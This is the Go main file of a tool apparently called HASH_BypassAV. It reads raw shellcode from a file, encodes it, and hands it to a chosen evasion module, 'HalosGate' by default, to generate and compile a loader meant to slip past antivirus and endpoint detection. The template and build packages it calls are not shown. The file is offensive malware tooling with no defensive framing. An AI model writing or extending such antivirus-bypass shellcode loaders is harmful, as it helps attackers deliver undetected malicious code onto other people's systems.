package main

import (
	"HASH_BypassAV/build"
	"HASH_BypassAV/parser"
	"encoding/hex"
	"flag"
)

func main() {

	var (
		c_2_shellcode  bool
		shellcode_path string
		module         string
	)

	flag.StringVar(&shellcode_path, "s", "shellcode.txt", "")
	flag.BoolVar(&c_2_shellcode, "c", false, "")
	flag.StringVar(&module, "m", "HalosGate", "")
	flag.Parse()

	var shellcode string

	if c_2_shellcode {
		//code = parser.OriginShellCode(shellcode_path)
		shellcode = parser.ParseShellCode(shellcode_path)
	} else {
		shellcode = hex.EncodeToString(parser.OriginShellCode(shellcode_path))
	}

	code := parser.GetFinalCode(module, shellcode)
	build.Build(code, module)
}
